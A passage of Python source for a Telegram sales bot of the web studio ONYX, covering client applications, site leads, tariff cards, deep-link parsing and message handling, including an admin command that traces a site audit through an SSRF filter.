    _set(f"onyx:app:{a['application_id']}", a, ttl=YEAR)
    sheet_core_app(a)
    return a


def _client_apps_index_add(cid, aid):
    ids = _get(f"onyx:client_apps:{cid}") or []
    ids.append(aid)
    _set(f"onyx:client_apps:{cid}", ids, ttl=YEAR)


def applications_by_client(cid):
    ids = _get(f"onyx:client_apps:{cid}") or []
    return [application_get(i) for i in ids if application_get(i)]


def application_create(client_id, tariff_id=None, options=None, questionnaire_id=None,
                       requisites=None, source=""):
    aid = _next_id("application")
    a = {"application_id": aid, "client_id": client_id, "number": aid,
         "questionnaire_id": questionnaire_id or "", "tariff_id": tariff_id or "",
         "options": options or [], "amount": app_amount(tariff_id, options),
         "requisites": requisites or {}, "status": "draft", "stage": "draft", "source": source,
         "version": 1, "parent_application_id": "", "assigned_to": "", "project_url": "",
         "comment": "", "created_at": now_str(), "updated_at": now_str()}
    _client_apps_index_add(client_id, aid)
    application_save(a)
    journal_add(client_id, "application_created", application_id=aid)
    return a


def application_new_version(aid):
    """Создать новую версию заявки. Старую НЕ удаляем (история сохраняется)."""
    old = application_get(aid)
    if not old:
        return None
    nid = _next_id("application")
    new = dict(old)
    new.update({"application_id": nid, "number": nid, "version": old.get("version", 1) + 1,
                "parent_application_id": aid, "created_at": now_str(), "updated_at": now_str()})
    _client_apps_index_add(old["client_id"], nid)
    application_save(new)
    journal_add(old["client_id"], "application_versioned", application_id=nid,
                extra=f"from #{aid}")
    return new


def application_set_status(aid, status, actor="system"):
    a = application_get(aid)
    if not a:
        return None
    prev = a.get("status")
    if prev == status:
        return a  # идемпотентность
    a["status"] = status
    application_save(a)
    journal_add(a["client_id"], "app_status_change", application_id=aid,
                prev=prev, new=status, extra=actor)
    return a


# ---- Анкеты с версиями (перезаполнение = новая версия, не перезапись) ----
def questionnaires_by_client(cid):
    ids = _get(f"onyx:client_quests:{cid}") or []
    return [_get(f"onyx:quest2:{i}") for i in ids if _get(f"onyx:quest2:{i}")]


def questionnaire_save_version(client_id, application_id, data):
    qid = _next_id("quest")
    q = {"questionnaire_id": qid, "client_id": client_id, "application_id": application_id or "",
         "data": data, "status": "filled",
         "version": len(questionnaires_by_client(client_id)) + 1,
         "created_at": now_str(), "updated_at": now_str()}
    _set(f"onyx:quest2:{qid}", q, ttl=YEAR)
    ids = _get(f"onyx:client_quests:{client_id}") or []
    ids.append(qid)
    _set(f"onyx:client_quests:{client_id}", ids, ttl=YEAR)
    journal_add(client_id, "questionnaire_saved", application_id=application_id,
                extra=f"v{q['version']}")
    return q


# ---- Лид с сайта (lead_id) + токен для персональной ссылки ----
def _wa_token(seed):
    return hashlib.sha1(f"{seed}-{time.time()}".encode("utf-8")).hexdigest()[:12]


def sitelead_get(lid):
    return _get(f"onyx:sitelead:{lid}") if lid else None


def sitelead_create(name="", phone="", email="", message="", page="", utm="", source="site"):
    lid = _next_id("lead")
    token = _wa_token(lid)
    l = {"lead_id": lid, "name": name, "phone": phone, "email": email, "message": message,
         "page": page, "source": source, "utm": utm, "status": "need_contact",
         "client_id": "", "assigned_to": "", "contacted_at": "", "wa_link_token": token,
         "created_at": now_str()}
    _set(f"onyx:sitelead:{lid}", l, ttl=YEAR)
    _set(f"onyx:watoken:{token}", lid, ttl=YEAR)
    if KV_URL:
        _redis("RPUSH", "onyx:siteleads_all", str(lid))
    else:
        _MEM.setdefault("_siteleads_all", []).append(lid)
    return l


def sitelead_by_token(token):
    lid = _get(f"onyx:watoken:{token}") if token else None
    return sitelead_get(lid) if lid else None


def sitelead_link_client(lid, cid):
    l = sitelead_get(lid)
    if l:
        l["client_id"] = cid
        l["status"] = "linked"
        l["contacted_at"] = now_str()
        _set(f"onyx:sitelead:{lid}", l, ttl=YEAR)
        journal_add(cid, "sitelead_linked", extra=str(lid))
    return l


# ---- Миграция: из старой onyx:user:{tg} в клиента core ----
def migrate_user_to_client(tg):
    existing = client_by_tg(tg)
    if existing:
        return existing
    p = user_get(tg)
    if not p:
        return None
    return client_get_or_create(telegram_id=tg, source=p.get("source", "legacy"),
                                name=p.get("name", ""), phone=p.get("phone", ""),
                                email=p.get("email", ""), username=p.get("username", ""))


def ensure_client(uid, user=None):
    """Мост старого профиля (onyx:user:{tg}) к Core-клиенту (раздельный client_id).
    Возвращает Core-клиента; core_client_id кладётся в профиль для связи."""
    user = user or {}
    p = user_get(uid) or {}
    c = client_by_tg(uid)
    if not c:
        c = client_get_or_create(
            telegram_id=uid, source=p.get("source", ""),
            name=p.get("name") or user.get("first_name", ""),
            phone=p.get("phone", ""), email=p.get("email", ""),
            username=user.get("username") or p.get("username", ""))
    else:
        # подтянуть свежие данные в Core (без дублей)
        c = client_get_or_create(
            telegram_id=uid, name=p.get("name", ""), phone=p.get("phone", ""),
            email=p.get("email", ""), username=user.get("username") or p.get("username", ""))
    if p.get("core_client_id") != c["client_id"]:
        p["core_client_id"] = c["client_id"]
        user_save(uid, p)
    return c


def client_id_of(uid):
    """Core client_id по Telegram ID (или создаёт связь)."""
    p = user_get(uid) or {}
    cid = p.get("core_client_id")
    if cid:
        return cid
    return ensure_client(uid)["client_id"]


# ============================================================================
#  ЭТАП 18: ИСТОЧНИКИ ВХОДА (deep-link) + тарифы-пакеты (без сопровождения)
# ============================================================================
# Тарифы-пакеты (данные с сайта onyx-web.ru, ежемесячное сопровождение УБРАНО).
# Цена = разовый запуск. Доп.опции подключаются отдельно (см. SERVICES/OPTIONS).
# Тарифы - ТОЧНО как на сайте onyx-web.ru (раздел «Тарифы»). Разработка 0 ₽,
# цена = разовый запуск. Ежемесячного сопровождения нет.
TARIFFS = [
    {"id": "start", "name": "Старт онлайн", "price": 5990,
     "desc": "Для бизнеса, которому нужен быстрый и понятный сайт без затрат на разработку.",
     "for": "экспертам, мастерам, салонам красоты, небольшим локальным компаниям, "
            "начинающим проектам, бизнесу, которому нужен быстрый выход в интернет",
     "includes": ["Одностраничный сайт для бизнеса", "Адаптация под телефон, планшет и компьютер",
                  "Главный экран с оффером", "Блок услуг или товаров", "Блок «О компании»",
                  "Блок преимуществ", "Контакты и кнопки связи", "Простая форма заявки",
                  "Базовая структура для продвижения", "Подключение домена",
                  "Размещение сайта на хостинге", "SSL-сертификат", "Публикация сайта",
                  "Базовая техническая настройка"]},
    {"id": "leads", "name": "Сайт + заявки", "price": 8900, "best": True,
     "desc": "Для бизнеса, которому нужен не просто сайт, а обращения от клиентов.",
     "for": "клиникам и стоматологиям, фитнес-клубам, салонам красоты, ремонтным и строительным "
            "компаниям, юридическим услугам, B2B-компаниям, локальному бизнесу, которому важны заявки",
     "includes": ["Всё из тарифа «Старт онлайн»", "Усиленная структура сайта под заявки",
                  "Доработка первого экрана и оффера",
                  "Блок доверия: отзывы, гарантии, кейсы или преимущества",
                  "Блок FAQ для закрытия возражений", "Telegram-уведомления о новых заявках",
                  "Подключение Яндекс Метрики", "Базовая настройка целей",
                  "Подключение карты или геосервиса", "Проверка работы формы заявки"]},
    {"id": "system", "name": "Сайт как система продаж", "price": 19900, "approx": True,
     "desc": "Для бизнеса, которому нужен сайт, заявки, аналитика и контроль обработки клиентов.",
     "for": "бизнесу с высоким средним чеком, компаниям, которые запускают рекламу, "
            "клиникам/студиям/салонам/фитнес-клубам, ремонтным/строительным/сервисным компаниям, "
            "бизнесу, где важно не терять заявки, кому нужна связка сайт + CRM + аналитика",
     "includes": ["Всё из тарифа «Сайт + заявки»", "Расширенная структура сайта",
                  "Дополнительные продающие блоки", "CRM-интеграция или таблица заявок",
                  "Онлайн-запись или калькулятор стоимости на выбор", "Расширенная аналитика",
                  "Настройка целей и событий", "Улучшенная логика заявок",
                  "Подготовка сайта к рекламе и продвижению"]},
]
TARIFF = {t["id"]: t for t in TARIFFS}
TARIFF_SHORT = {"start": "Старт онлайн", "leads": "Сайт + заявки", "system": "Сайт как система продаж"}


def tariff_price(t):
    return ("от " if t.get("approx") else "") + fmt_amount(t["price"])


def tariffs_list_text(uid):
    chosen = (user_get(uid) or {}).get("chosen_tariff")
    head = ["📦 <b>Тарифы ONYX</b>", "",
            "Разработка в любом тарифе - <b>0 ₽</b>. "
            "Платите только за запуск, и только после того, как утвердите готовый сайт.", ""]
    for t in TARIFFS:
        mark = "✅ " if chosen == t["id"] else ""
        best = "  ⭐️ <i>чаще всего выбирают</i>" if t.get("best") else ""
        head.append(f"{mark}<b>{t['name']}</b> - {tariff_price(t)}{best}")
        head.append(f"<i>{t['desc']}</i>")
        head.append("")
    head.append("Нажмите тариф, чтобы увидеть состав 👇")
    return "\n".join(head)


def tariff_image_url(tid):
    """Карточка тарифа. Лежит в public/tariffs - Vercel отдаёт её статикой."""
    return f"{public_base()}/tariffs/{tid}.png"


def tariff_anim_url(tid):
    return f"{public_base()}/tariffs/{tid}.mp4"


def send_tariff_card(chat_id, tid, caption=None):
    """Одна карточка тарифа картинкой.

    Telegram скачивает файл по ссылке только при первой отправке и возвращает
    file_id - его кладём в KV и дальше шлём мгновенно, без повторной выкачки
    900 КБ на каждого клиента. Если картинка почему-то не отдалась, возвращаем
    False, и вызывающий код просто продолжает текстом: воронка не ломается."""
    t = TARIFF.get(tid)
    if not t:
        return False
    cap = caption if caption is not None else (
        f"<b>{t['name']}</b>\nЗапуск {tariff_price(t)} · разработка <b>0 ₽</b>")

    key = f"onyx:tariff_fid:{tid}"
    fid = _get(key)
    if fid:
        r = tg("sendPhoto", chat_id=chat_id, photo=fid, caption=cap, parse_mode="HTML")
        if r and r.get("ok"):
            return True
        _set(key, None)  # file_id протух - сбрасываем и пробуем по ссылке

    r = tg("sendPhoto", chat_id=chat_id, photo=tariff_image_url(tid),
           caption=cap, parse_mode="HTML")
    if not (r and r.get("ok")):
        return False
    try:
        photos = (r.get("result") or {}).get("photo") or []
        if photos:
            _set(key, photos[-1]["file_id"], ttl=60 * 60 * 24 * 30)
    except Exception:
        pass
    return True


def send_tariff_album(chat_id, uid):
    """Карточки тарифов. По умолчанию - анимированные (3D-кристалл, зацикленный MP4),
    каждая отдельным сообщением: альбом Telegram анимации не проигрывает.
    Если анимации выключены или не отдались - альбом из статичных карточек,
    если и его нет - текст. Воронка не ломается ни при одном раскладе."""
    base = public_base()
    sent = 0
    if base and TARIFF_ANIMATED:
        for i, t in enumerate(TARIFFS):
            best = "\n⭐️ <i>оптимальный выбор</i>" if t.get("best") else ""
            cap = (f"<b>{t['name']}</b>\nЗапуск {tariff_price(t)} · разработка <b>0 ₽</b>\n"
                   f"<i>{t['desc']}</i>{best}")
            if i == 0:
                cap = ("📦 <b>ТАРИФЫ ONYX</b>\nРазработка в любом - <b>0 ₽</b>, "
                       "платите только за запуск.\n\n" + cap)
            r = tg("sendAnimation", chat_id=chat_id, animation=tariff_anim_url(t["id"]),
                   caption=cap, parse_mode="HTML")
            if r and r.get("ok"):
                sent += 1
            else:
                break
    if sent != len(TARIFFS) and base:
        media = []
        for i, t in enumerate(TARIFFS):
            best = "  ⭐️ оптимальный выбор" if t.get("best") else ""
            cap = f"<b>{t['name']}</b> - запуск {tariff_price(t)}{best}\n<i>{t['desc']}</i>"
            if i == 0:
                cap = ("📦 <b>ТАРИФЫ ONYX</b>\nРазработка в любом - <b>0 ₽</b>, "
                       "платите только за запуск.\n\n" + cap)
            media.append({"type": "photo", "media": tariff_image_url(t["id"]),
                          "caption": cap, "parse_mode": "HTML"})
        r = tg("sendMediaGroup", chat_id=chat_id, media=media)
        sent = len(TARIFFS) if (r and r.get("ok")) else 0

        # Альбом капризен: одна недоступная ссылка роняет всю группу целиком.
        # Тогда шлём карточки поштучно - так клиент всё равно увидит картинки.
        if not sent:
            for i, t in enumerate(TARIFFS):
                best = "\n⭐️ <i>оптимальный выбор</i>" if t.get("best") else ""
                cap = (f"<b>{t['name']}</b>\nЗапуск {tariff_price(t)} · разработка <b>0 ₽</b>\n"
                       f"<i>{t['desc']}</i>{best}")
                if i == 0:
                    cap = ("📦 <b>ТАРИФЫ ONYX</b>\nРазработка в любом - <b>0 ₽</b>, "
                           "платите только за запуск.\n\n" + cap)
                if send_tariff_card(chat_id, t["id"], caption=cap):
                    sent += 1

    if sent != len(TARIFFS):
        _sheet_note_images_down(sent)
        send_rich(chat_id, tariffs_after_md(), reply_markup=tariffs_list_kb(uid))
        return
    send_rich(chat_id, tariffs_after_md(), reply_markup=tariffs_list_kb(uid))


def tariffs_after_md():
    """Текст под карточками тарифов.

    Раньше здесь было «Какой тариф берём?» - вопрос, на который человек чаще
    всего не может ответить: он не знает, чем пакеты отличаются для его случая.
    В итоге он молча закрывал чат.

    Теперь развилка. Не определился - зовём на консультацию, где подберём.
    Определился - выбирает и идёт дальше. Оба пути ведут в воронку."""
    return "\n".join([
        "## Не уверены, что выбрать?", "",
        "Это нормально: со стороны пакеты похожи, а разница вылезает уже в работе.", "",
        "Приходите на **бесплатную консультацию**. Посмотрим ваш бизнес, разберём, "
        "откуда у вас приходят клиенты, и я скажу прямо, какого пакета вам хватит. "
        "Часто оказывается, что нужен тариф дешевле, чем человек думал.", "",
        "Тридцать минут, без оплаты и без обязательств. План останется у вас "
        "в любом случае.", "",
        "---", "",
        "*Уже определились - выбирайте пакет ниже, оформим сразу.*",
    ])


def _sheet_note_images_down(sent):
    """Картинки тарифов не ушли - это тихая поломка: клиент видит текст и не
    понимает, что что-то не так. Сообщаем администратору, но не чаще раза в час,
    чтобы не залить чат при массовом заходе."""
    try:
        if _get("onyx:imgfail:notified"):
            return
        _set("onyx:imgfail:notified", 1, ttl=3600, immediate=True)
        base = public_base()
        raw = os.environ.get("TARIFF_IMG_BASE") or os.environ.get("PUBLIC_BASE_URL") or ""
        hint = ""
        if raw and clean_base_url(raw) != raw.strip().rstrip("/"):
            # Самая частая причина: в поле значения на Vercel лежит лишнее -
            # имя переменной, кавычки, пробелы. Показываем это прямо.
            hint = ("\n\n<b>Похоже, в переменной лишний текст.</b>\n"
                    f"Сейчас там: <code>{_esc(raw[:80])}</code>\n"
                    "Должен быть только адрес, без имени и знака равенства.")
        notify_admins(
            "⚠️ <b>Карточки тарифов не отправляются</b>\n"
            f"Ушло {sent} из {len(TARIFFS)}. Клиенты видят текстовый список.\n\n"
            f"Откройте в браузере: {base}/tariffs/start.png\n"
            "Не открылось - файлы не попали в деплой или адрес неверный."
            + hint)
    except Exception:
        pass


def tariffs_list_kb(uid):
    """Первой кнопкой - консультация: она и есть цель воронки.

    Тарифы ниже для тех, кто уже решил. Так мы не мешаем готовому клиенту
    оформиться и не теряем сомневающегося, которому просто не с кем
    посоветоваться."""
    chosen = (user_get(uid) or {}).get("chosen_tariff")
    rows = [[{"text": "🎯 Подобрать на бесплатной консультации",
              "callback_data": "cons:offer"}]]
    rows += [[{"text": ("✅ " if chosen == t["id"] else "") + f"{t['name']} · {tariff_price(t)}",
              "callback_data": f"trf:v:{t['id']}"}] for t in TARIFFS]
    rows.append([{"text": "➕ Доп. опции", "callback_data": "options:list"}])
    rows.append(nav_row(uid))
    return {"inline_keyboard": rows}


def tariff_card_text(tid, uid):
    t = TARIFF.get(tid)
    if not t:
        return "Тариф не найден."
    lines = [f"📦 <b>{t['name']}</b>",
             f"💰 Запуск <b>{tariff_price(t)}</b> · разработка 0 ₽", "",
             f"<i>{t['desc']}</i>", "", "<b>Что входит</b>"]
    lines += [f"✓ {x}" for x in t["includes"]]
    lines += ["", f"<b>Кому подходит</b>\n{t['for']}"]
    if (user_get(uid) or {}).get("chosen_tariff") == tid:
        lines.append("\n✅ <i>Этот тариф выбран в вашей заявке.</i>")
    return "\n".join(lines)


def tariff_card_kb(tid, uid):
    """Внутри карточки та же развилка: взять этот пакет или сначала обсудить.

    Человек, открывший карточку, уже склоняется к покупке - но у него остались
    вопросы, иначе он бы не читал состав. Кнопка «сомневаюсь» ловит именно
    его, вместо того чтобы отпустить думать."""
    chosen = (user_get(uid) or {}).get("chosen_tariff") == tid
    rows = []
    if not chosen:
        rows.append([{"text": "✅ Беру этот пакет", "callback_data": f"trf:pick:{tid}"}])
    rows.append([{"text": "🤔 Сомневаюсь - обсудим на консультации",
                  "callback_data": "cons:offer"}])
    rows.append([{"text": "⬅️ Все тарифы", "callback_data": "tariffs:list"},
                 {"text": "➕ Доп. опции", "callback_data": "options:list"}])
    return {"inline_keyboard": rows}


def set_source(uid, source, extra=None):
    """Зафиксировать источник входа у клиента (не перезатирая первый источник)."""
    p = user_get(uid) or {}
    if not p.get("source"):
        p["source"] = source
    p["last_source"] = source
    if extra:
        p.update(extra)
    p["updated"] = now_str()
    user_save(uid, p)


def parse_start_payload(payload):
    """Разбор deep-link /start <payload> → (source, target_type, target_id)."""
    payload = (payload or "").strip()
    if not payload:
        return ("direct", None, None)
    if payload.startswith("ref"):
        return ("referral", "ref", payload[3:])
    if payload.startswith("t_"):
        return ("site_tariff", "tariff", payload[2:])
    if payload.startswith("o_"):
        return ("site_option", "option", payload[2:])
    if payload.startswith("lm_"):
        return ("lead_magnet", "campaign", payload[3:])
    if payload.startswith("lead_"):
        return ("site_lead", "lead_token", payload[5:])
    if payload == "build":
        return ("cta_build", None, None)
    if payload == "checklist":
        return ("cta_checklist", None, None)
    if payload == "audit":
        return ("cta_audit", None, None)
    if payload.startswith("a_"):
        # Сайт передал адрес прямо в ссылке - аудит стартует сразу, без вопросов.
        # Домен закодирован base64url: в deep-link Telegram точки недопустимы.
        return ("cta_audit", "url", decode_audit_payload(payload[2:]))
    return ("other", "raw", payload)


def encode_audit_payload(domain):
    """Домен → безопасный для deep-link кусок (A-Za-z0-9_-)."""
    raw = base64.urlsafe_b64encode((domain or "").strip().encode("utf-8"))
    return raw.decode("ascii").rstrip("=")


def decode_audit_payload(token):
    try:
        pad = "=" * (-len(token) % 4)
        return base64.urlsafe_b64decode(token + pad).decode("utf-8", "ignore").strip()
    except Exception:
        return ""


THREE_WAY_KB = {"inline_keyboard": [
    [{"text": "📋 Получить чек-лист", "callback_data": "go:checklist"}],
    [{"text": "🔍 Бесплатный аудит сайта", "callback_data": "go:audit"}],
    [{"text": "🌐 Разработать сайт", "callback_data": "brief:start"}],
]}


def start_by_source(chat_id, uid, user, source, ttype, tid):
    """Приветствие и первый шаг под источник входа."""
    set_source(uid, source)
    uname = user.get("username", "")

    if source == "site_tariff" and tid in TARIFF:
        t = TARIFF[tid]
        p = user_get(uid) or {}
        p["chosen_tariff"] = tid; user_save(uid, p)
        log_event(uid, "tariff_selected", tid)
        lead_touch(uid, username=uname, status="tariff_selected", action="tariff_selected", inc_tariffs=True)
        recompute_tags(uid)
        txt = (f"📦 <b>Тариф: {t['name']}</b>\n"
               f"💰 Запуск: <b>{tariff_price(t)}</b>\n\n"
               f"{t['desc']}\n\n"
               "✅ Тариф добавлен в вашу заявку. Следующий шаг - короткая анкета, "
               "затем консультация с разработчиком. Оплата - только после того, "
               "как вы увидите и утвердите готовый сайт.")
        send(chat_id, txt, {"inline_keyboard": [
            [{"text": "📝 Продолжить - заполнить анкету", "callback_data": "brief:start"}],
            [{"text": "🔁 Изменить тариф", "callback_data": "tariffs:list"},
             {"text": "➕ Доп. опции", "callback_data": "options:list"}],
            [{"text": "📦 Все тарифы", "callback_data": "tariffs:list"}],
        ]})
        return

    if source == "site_option" and tid in SERVICE:
        set_source(uid, source)
        log_event(uid, "service_add", tid)
        lead_touch(uid, username=uname, action="option_view")
        send(chat_id, service_card_text(tid, uid), service_card_kb(tid, uid))
        return

    if source == "cta_build":
        lead_touch(uid, username=uname, action="cta_build")
        recompute_tags(uid)
        send(chat_id, "🔥 <b>Отлично, запускаем разработку!</b>\n\n"
                      "Как это работает:\n"
                      "1. Заполняете короткую анкету о бизнесе.\n"
                      "2. Выбираете тариф и нужные опции.\n"
                      "3. Указываете реквизиты.\n"
                      "4. Консультация с разработчиком.\n"
                      "5. Мы делаем сайт и показываем вам.\n"
                      "6. Вы утверждаете - и только тогда официальная оплата через «Мой налог».\n\n"
                      "Начнём с анкеты 👇",
             {"inline_keyboard": [[{"text": "📝 Заполнить анкету", "callback_data": "brief:start"}],
                                  [{"text": "📦 Сначала тарифы", "callback_data": "tariffs:list"}]]})
        return

    if source == "cta_audit":
        # Адрес пришёл вместе со ссылкой - не переспрашиваем, сразу проверяем.
        url = valid_url(tid) if (ttype == "url" and tid) else None
        if url:
            lead_touch(uid, username=uname, source="site", action="audit_from_site")
            log_event(uid, "audit_from_site", url)
            audit_start(chat_id, uid, url, username=uname)
            return
        state_set(uid, {"flow": "audit_url"})
        send(chat_id, AUDIT_INTRO, {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
        return

    if source == "site_lead":
        # персональная ссылка после заявки с сайта - связываем лид с Telegram-профилем
        lead_touch(uid, username=uname, source="site", action="from_site_lead")
        try:
            link_site_lead_by_token(uid, tid, user)
        except Exception as e:
            print("site lead link err", e)
        send(chat_id, "👋 <b>Добро пожаловать в ONYX!</b>\n"
                      "Мы продолжим здесь, в боте - так удобнее вести проект и видеть статус.\n\n"
                      "С чего начнём?", THREE_WAY_KB)
        return

    # lead_magnet, referral, direct, other → общий вход с 3 сценариями
    if source == "lead_magnet":
        send(chat_id, "👋 <b>Рады видеть вас в ONYX!</b>\n"
                      "Мы делаем сайты для бизнеса - разработка 0 ₽, оплата по счёту только после "
                      "готового и утверждённого сайта.\n\nВыберите, что интереснее:", THREE_WAY_KB)
        return
    if source == "cta_checklist":
        checklist_delivered(uid)
    start_flow(chat_id, uid)


def link_site_lead_by_token(uid, token, user):
    """Связать Telegram-пользователя с предварительной заявкой сайта по wa-токену."""
    if not token:
        return
    lead = _get(f"onyx:site_lead:{token}")
    if not lead:
        return
    lead["telegram_id"] = uid
    lead["status"] = "linked_telegram"
    lead["linked_at"] = now_str()
    _set(f"onyx:site_lead:{token}", lead, ttl=YEAR)
    # переносим известные данные, чтобы не спрашивать повторно
    p = user_get(uid) or {}
    for k in ("name", "phone", "email"):
        if lead.get(k) and not p.get(k):
            p[k] = lead[k]
    p["site_lead_token"] = token
    user_save(uid, p)
    notify_admins(f"🔗 Лид сайта связан с Telegram: id {uid} ↔ токен {token}")


# ------------------------- Обработка сообщений -------------------------
def process_message(msg):
    chat_id = msg["chat"]["id"]
    user = msg.get("from", {})
    uid = user.get("id")
    text = clean_user_text(msg.get("text"))
    contact = msg.get("contact")

    if not rate_ok(uid, "msg"):
        rate_notice(chat_id, uid, "msg")
        return

    # Кнопка «Меню» слева от поля ввода. Раз в сутки убеждаемся, что список
    # команд у Telegram актуальный: после смены списка админов или добавления
    # команды меню обновится само, руками ничего делать не нужно.
    setup_bot_commands()

    subscribe(uid)

    # Голосовое от админа по команде /voiceid - вернуть file_id для настройки
    _v = msg.get("voice")
    if _v and is_admin(uid) and (state_get(uid) or {}).get("flow") == "voiceid":
        state_del(uid)
        send_rich(chat_id, "# 🎙 Готово\n\nПоложите это в переменную "
                           f"`MODEL_VOICE_FILE_ID` на Vercel:\n\n```\n{_v.get('file_id', '')}\n```")
        return

    # --- Этап 8: приём видеоотзыва (кружок или обычное видео) ---
    vnote = msg.get("video_note") or msg.get("video")
    if vnote:
        st = state_get(uid)
        if st and st.get("flow") == "review":
            r = review_get(st.get("rid"))
            if r:
                r["video_file_id"] = vnote.get("file_id", "")
                r["status"] = "video_received"
                review_save(r, to_sheet=False)
                send(chat_id, "📹 Видеоотзыв получен, спасибо!")
                review_preview(chat_id, uid, r["review_id"])
                return
        if st and st.get("flow") == "upload":
            handle_upload(chat_id, uid, st, vnote.get("file_id", ""),
                          msg.get("caption") or "", "video")
            return
        send(chat_id, "Спасибо за видео! Если это отзыв - откройте «⭐ Оценить сервис» в меню.\n"
                      "Если это материал для сайта - «👤 Личный кабинет» → «📎 Материалы».", MAIN_MENU)
        return

    # --- Материалы для сайта: фото, документы, аудио ---
    media = msg.get("photo") or msg.get("document") or msg.get("audio")
    if media:
        st = state_get(uid)
        if st and st.get("flow") == "upload":
            if isinstance(media, list):          # photo приходит списком размеров
                fid, fname, fsize = media[-1].get("file_id", ""), "", media[-1].get("file_size", 0)
            else:
                fid = media.get("file_id", "")
                fname = media.get("file_name", "")
                fsize = media.get("file_size", 0)
            handle_upload(chat_id, uid, st, fid, fname, None, file_size=fsize)
            return
        send(chat_id, "📎 Получили файл! Чтобы он попал в папку вашего проекта, "
                      "нажмите кнопку ниже и выберите, что это.",
             {"inline_keyboard": [[{"text": "📎 Загрузить материалы", "callback_data": "up:open"}]]})
        return

    if text == "🏠 Главное меню":
        state_del(uid); main_menu(chat_id); return
    if text.startswith("/start"):
        parts = text.split(maxsplit=1)
        payload = parts[1].strip() if len(parts) > 1 else ""
        # Точка 4: не терять незавершённую анкету - предложить продолжить
        _st = state_get(uid)
        if not payload and _st and _st.get("flow") == "brief" and _st.get("i", 0) > 0 \
                and _st.get("i", 0) < len(steps_of(_st)):
            send(chat_id, f"📝 Вы не закончили анкету (вопрос {_st['i']+1} из {len(steps_of(_st))}). Продолжить?",
                 {"inline_keyboard": [
                     [{"text": "▶️ Продолжить анкету", "callback_data": "brief:resume"}],
                     [{"text": "🔄 Начать заново", "callback_data": "brief:restart"}],
                     [{"text": "🏠 В меню", "callback_data": "b:home"}]]})
            return
        state_del(uid)
        existed = bool(user_get(uid))
        register_client(uid, user)
        source, ttype, tid = parse_start_payload(payload)
        if not existed:
            log_event(uid, "start", payload or "direct")
            schedule_followup(uid, "idle_after_start", user.get("username", ""))
        lead_touch(uid, username=user.get("username"), name=user.get("first_name"),
                   source=source, action="start")
        recompute_tags(uid)
        # реферал
        if source == "referral" and tid and tid.isdigit() and int(tid) != uid:
            p = user_get(uid)
            if not p.get("referred_by"):
                p["referred_by"] = int(tid); user_save(uid, p)
                rp = user_get(int(tid))
                if rp:
                    rp["referrals"] = rp.get("referrals", 0) + 1; user_save(int(tid), rp)
                    notify_manager(f"🤝 Новый реферал у id {tid}: id {uid}")
        start_by_source(chat_id, uid, user, source, ttype, tid); return
    if text == "/id":
        send(chat_id, f"Ваш chat_id: <code>{chat_id}</code>"); return
    if text.startswith("/audittest") and is_admin(uid):
        # Разбор аудита по шагам: где именно обрывается - в проверке адреса,
        # в разрешении имени или уже на самом запросе. Нужно, потому что
        # клиенту мы показываем одну общую фразу «не смогли открыть».
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            send(chat_id, "Формат: <code>/audittest example.com</code>"); return
        raw = parts[1].strip()
        url = valid_url(raw)
        lines = [f"🔬 <b>Разбор аудита</b>\n<code>{_esc(raw[:80])}</code>", ""]
        lines.append(f"1. Нормализация: <code>{_esc(str(url))}</code>")
        if not url:
            lines.append("\n❌ Адрес не прошёл проверку формата - до сети не дошли.")
            send(chat_id, "\n".join(lines)); return

        u = urllib.parse.urlparse(url)
        port = u.port or (443 if u.scheme == "https" else 80)
        ips, dns_err = resolve_ips(u.hostname or "", port)
        lines.append(f"2. Домен: <code>{_esc(u.hostname or '')}</code> · порт {port}")
        if dns_err:
            lines.append(f"   ❌ Имя не разрешается: <code>{_esc(dns_err)}</code>")
        else:
            marks = [f"{ip} {'✅' if _ip_is_public(ip) else '⛔'}" for ip in ips[:6]]
            lines.append("   Адреса: " + ", ".join(f"<code>{_esc(m)}</code>" for m in marks))

        allowed, why = ssrf_check(url)
        lines.append(f"3. Фильтр SSRF: {'✅ пропускает' if allowed else '⛔ блокирует'}"
                     + (f"\n   Причина: <i>{_esc(why)}</i>" if why else ""))

        if allowed:
            t0 = time.time()
            code, hdrs, body, secs, final = _fetch(url)
            lines.append(f"4. Запрос: код <b>{code}</b> за {secs:.1f} с")
            lines.append(f"   Итоговый адрес: <code>{_esc(str(final)[:80])}</code>")
            lines.append(f"   Размер ответа: {len(body)} символов")
            if code == 0:
                lines.append(f"   ❌ Текст ошибки: <code>{_esc(str(body)[:160])}</code>")
            srv = (hdrs or {}).get("Server") or ""
            if srv:
                lines.append(f"   Server: <code>{_esc(srv[:40])}</code>")
        else:
            lines.append("4. Запрос не выполнялся - отклонён фильтром.")

        send(chat_id, "\n".join(lines)); return

    if text == "/menurefresh" and is_admin(uid):
        ok_menu = setup_bot_commands(force=True)
        send(chat_id,
             ("✅ <b>Меню обновлено</b>\n\n"
              f"Клиентам видна {len(CLIENT_COMMANDS)} команда, "
              f"вам - {len(ADMIN_COMMANDS)}.\n\n"
              "<i>Telegram кеширует список: если кнопка ещё показывает старое, "
              "закройте и откройте чат с ботом.</i>")
             if ok_menu else
             "⚠️ Не удалось обновить меню - подробности в разделе «Ошибки».")
        return
    if text in ("/cancel", "Отмена", "отмена"):
        state_del(uid); main_menu(chat_id, "Отменено."); return

    if is_admin(uid) and text.startswith("/"):
        low = text.strip()
        if low.startswith("/partners"):
            ids = partners_all()
            if not ids:
                send(chat_id, "Заявок партнёров пока нет."); return
            lines = ["🤝 <b>Партнёры</b>"]
            for puid in ids[-20:]:
                p = partner_get(puid)
                if not p:
                    continue
                lines.append(f"{p['partner_code']} · id {puid} · {p.get('name', '-')} · "
                             f"{p.get('activity', '-')} · {PARTNER_STATUS_RU.get(p.get('partner_status'), '')}")
            send(chat_id, "\n".join(lines)); return
        if low.startswith("/partner_status"):
            parts = (text or "").split()
            if len(parts) < 3:
                send(chat_id, "Формат: /partner_status &lt;telegram_id&gt; &lt;статус&gt;\n"
                              "Статусы: " + ", ".join(PARTNER_STATUS_RU.keys())); return
            try:
                puid = int(parts[1])
            except Exception:
                send(chat_id, "id должен быть числом."); return
            key = parts[2]
            if key not in PARTNER_STATUS_RU:
                send(chat_id, "Статусы: " + ", ".join(PARTNER_STATUS_RU.keys())); return
            p = partner_get(puid)
            if not p:
                send(chat_id, "Партнёр не найден."); return
            p["partner_status"] = key
            partner_save(p)
            send(chat_id, f"✅ {p['partner_code']} → {PARTNER_STATUS_RU[key]}")
            try:
                send(puid, f"🤝 Статус вашей заявки партнёра обновлён: "
